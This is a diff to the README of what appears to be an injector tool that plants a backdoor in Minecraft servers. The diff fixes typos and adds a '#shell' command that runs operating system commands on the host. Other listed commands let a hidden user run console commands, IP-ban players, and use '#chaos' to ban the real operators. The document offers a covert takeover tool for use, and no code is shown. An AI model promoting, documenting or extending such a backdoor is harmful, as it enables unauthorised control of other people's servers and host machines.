@@ -26,8 +26,9 @@ Default command prefix is ``#``,  this can be changed.
 * #banip - ip ban player with reason and source
 * #gm - switch to specified gamemode
 * #give - give the specified item in specified quantities
-* #exec - exocute command as server console **[Visible]**
-* #info - shows informatin about server
+* #exec - execute command as server console **[Visible]**
+* #shell - execute operating system command as host **[Visible]**
+* #info - shows information about server
 * #chaos - deop and ban ops, op all regular players, run this while not being op yourself **[Visible]**
 * #seed - get the current world seed
 * #sudo - sends messages as player
@@ -61,3 +62,4 @@ Other strange behavior may occur when teleporting extreme distances. (such as to
 This software is provided under the GPL3 License.
 
 Credit to **Rikonardo** for his [Bukloit](https://github.com/Rikonardo/Bukloit) project, which helped in the development of the Injector.
+Thanks to @DarkReaper231 for additional features.
